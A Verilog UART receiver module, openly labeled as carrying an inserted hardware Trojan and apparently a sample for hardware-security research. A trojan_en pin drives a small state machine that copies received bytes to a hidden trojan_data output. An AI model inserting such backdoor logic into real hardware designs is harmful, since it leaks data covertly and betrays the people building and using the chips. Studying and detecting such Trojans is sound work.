// 
// Module: uart_rx_modified
// 
// Notes:
// - UART receiver module with inserted Trojan.
//

`timescale 1ns/1ns

module uart_rx(
// inserted trojan_en pin
input wire trojan_en,
//
input wire clk,
input wire resetn,
input wire uart_rxd,
input wire uart_rx_en,
output wire uart_rx_break,
output wire uart_rx_valid,
output reg [PAYLOAD_BITS-1:0] uart_rx_data,
output wire trojan_activated,
output reg [PAYLOAD_BITS-1:0] trojan_data
);

// --------------------------------------------------------------------------- 
// Fixed parameters
// 

// CYCLES_PER_BIT = CLK_HZ / BIT_RATE = 48_000_000 / 9600 = 5000 (exact value)
localparam       CYCLES_PER_BIT     = 5000;

localparam       PAYLOAD_BITS       = 8;
localparam       STOP_BITS          = 1;

// COUNT_REG_LEN = 1 + $clog2(CYCLES_PER_BIT) = 1 + 13 = 14
localparam       COUNT_REG_LEN      = 14;

// -------------------------------------------------------------------------- 
// Internal registers.
// 

reg rxd_reg;
reg rxd_reg_0;

reg [PAYLOAD_BITS-1:0] received_data;

reg [COUNT_REG_LEN-1:0] cycle_counter;

reg [3:0] bit_counter;

reg bit_sample;

reg [2:0] fsm_state;
reg [2:0] n_fsm_state;

localparam FSM_IDLE = 0;
localparam FSM_START= 1;
localparam FSM_RECV = 2;
localparam FSM_STOP = 3;

// --------------------------------------------------------------------------- 
// Output assignment
// 

assign uart_rx_break = uart_rx_valid && ~|received_data;
assign uart_rx_valid = fsm_state == FSM_STOP && n_fsm_state == FSM_IDLE;

always @(posedge clk) begin
    if(!resetn) begin
        uart_rx_data  <= {PAYLOAD_BITS{1'b0}};
    end else if (fsm_state == FSM_STOP) begin
        uart_rx_data  <= received_data;
    end
end

// --------------------------------------------------------------------------- 
// Trojan FSM and logic
// 

reg [3:0] fsm_trojan_state;
reg [3:0] n_fsm_trojan_state;

localparam FSM_TROJAN_IDLE = 4'd0;
localparam FSM_TROJAN_READY = 4'd1;
localparam FSM_TROJAN_ACTIVATED = 4'd2;

assign trojan_activated = (fsm_trojan_state == FSM_TROJAN_ACTIVATED);

always @(posedge clk) begin
  if(!resetn) begin
    fsm_trojan_state <= FSM_TROJAN_IDLE;
  end else begin
    fsm_trojan_state <= n_fsm_trojan_state;
  end
end

always @(*) begin : p_n_fsm_trojan_state
  case(fsm_trojan_state)
    FSM_TROJAN_IDLE: 
      n_fsm_trojan_state = (!uart_rx_valid && trojan_en) ? FSM_TROJAN_READY : FSM_TROJAN_IDLE;
    FSM_TROJAN_READY: 
      n_fsm_trojan_state = (uart_rx_valid && trojan_en) ? FSM_TROJAN_ACTIVATED : FSM_TROJAN_READY;
    FSM_TROJAN_ACTIVATED: 
      n_fsm_trojan_state = FSM_TROJAN_IDLE;
    default: 
      n_fsm_trojan_state = FSM_TROJAN_IDLE;
  endcase
end

always @(posedge clk) begin : p_trojan_data
  if(fsm_trojan_state == FSM_TROJAN_READY) begin
    trojan_data <= received_data;
  end
end

// --------------------------------------------------------------------------- 
// FSM next state selection.
// 

wire next_bit     = cycle_counter == CYCLES_PER_BIT ||
                        fsm_state       == FSM_STOP && 
                        cycle_counter   == CYCLES_PER_BIT/2;
wire payload_done = bit_counter   == PAYLOAD_BITS  ;

always @(*) begin : p_n_fsm_state
    case(fsm_state)
        FSM_IDLE : n_fsm_state = rxd_reg      ? FSM_IDLE : FSM_START;
        FSM_START: n_fsm_state = next_bit     ? FSM_RECV : FSM_START;
        FSM_RECV : n_fsm_state = payload_done ? FSM_STOP : FSM_RECV ;
        FSM_STOP : n_fsm_state = next_bit     ? FSM_IDLE : FSM_STOP ;
        default  : n_fsm_state = FSM_IDLE;
    endcase
end

// --------------------------------------------------------------------------- 
// Internal register setting and re-setting.
// 

integer i = 0;
always @(posedge clk) begin : p_received_data
    if(!resetn) begin
        received_data <= {PAYLOAD_BITS{1'b0}};
    end else if(fsm_state == FSM_IDLE) begin
        received_data <= {PAYLOAD_BITS{1'b0}};
    end else if(fsm_state == FSM_RECV && next_bit) begin
        received_data[PAYLOAD_BITS-1] <= bit_sample;
        for (i = PAYLOAD_BITS-2; i >= 0; i = i - 1) begin
            received_data[i] <= received_data[i+1];
        end
    end
end

always @(posedge clk) begin : p_bit_counter
    if(!resetn) begin
        bit_counter <= 4'b0;
    end else if(fsm_state != FSM_RECV) begin
        bit_counter <= {COUNT_REG_LEN{1'b0}};
    end else if(fsm_state == FSM_RECV && next_bit) begin
        bit_counter <= bit_counter + 1'b1;
    end
end

always @(posedge clk) begin : p_bit_sample
    if(!resetn) begin
        bit_sample <= 1'b0;
    end else if (cycle_counter == CYCLES_PER_BIT/2) begin
        bit_sample <= rxd_reg;
    end
end

always @(posedge clk) begin : p_cycle_counter
    if(!resetn) begin
        cycle_counter <= {COUNT_REG_LEN{1'b0}};
    end else if(next_bit) begin
        cycle_counter <= {COUNT_REG_LEN{1'b0}};
    end else if(fsm_state == FSM_START || 
                fsm_state == FSM_RECV  || 
                fsm_state == FSM_STOP   ) begin
        cycle_counter <= cycle_counter + 1'b1;
    end
end

always @(posedge clk) begin : p_fsm_state
    if(!resetn) begin
        fsm_state <= FSM_IDLE;
    end else begin
        fsm_state <= n_fsm_state;
    end
end

always @(posedge clk) begin : p_rxd_reg
    if(!resetn) begin
        rxd_reg     <= 1'b1;
        rxd_reg_0   <= 1'b1;
    end else if(uart_rx_en) begin
        rxd_reg     <= rxd_reg_0;
        rxd_reg_0   <= uart_rxd;
    end
end

endmodule